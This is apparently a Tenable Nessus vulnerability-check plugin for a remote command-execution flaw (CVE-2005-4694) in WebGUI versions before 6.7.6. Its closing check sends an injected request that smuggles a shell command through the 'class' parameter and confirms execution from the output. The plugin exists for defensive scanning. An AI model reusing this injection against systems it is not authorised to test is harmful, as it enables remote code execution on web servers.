#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20014);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2013/01/02 23:39:10 $");

  script_cve_id("CVE-2005-4694");
  script_bugtraq_id(15083);
  script_osvdb_id(19933);

  script_name(english:"WebGUI < 6.7.6 Asset.pm Asset Addition Arbitrary Code Execution");
  script_summary(english:"Checks for arbitrary remote command execution in WebGUI < 6.7.6");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is prone to arbitrary
code execution.");
  script_set_attribute(attribute:"description", value:
"The remote host is running WebGUI, a content management system from
Plain Black Software. 

The installed version of WebGUI on the remote host fails to sanitize
user-supplied input via the 'class' variable to various sources before
using it to run commands.  By leveraging this flaw, an attacker may be
able to execute arbitrary commands on the remote host within the
context of the affected web server userid.");
   # http://web.archive.org/web/20070307175826/http://www.plainblack.com/getwebgui/advisories/security-exploit-patch-for-6.3-and-above
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?37c9ea6b");
  script_set_attribute(attribute:"solution", value:"Upgrade to WebGUI 6.7.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/10/17");
  script_set_attribute(attribute:"vuln_publication_date", value:"2005/10/12");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:plain_black:webgui");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


http_check_remote_code (
			check_request:"/index.pl/homels?func=add;class=WebGUI::Asset::Wobject::Article%3bprint%20%60id%60;",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			extra_check:'<meta name="generator" content="WebGUI 6',
			command:"id"
			);
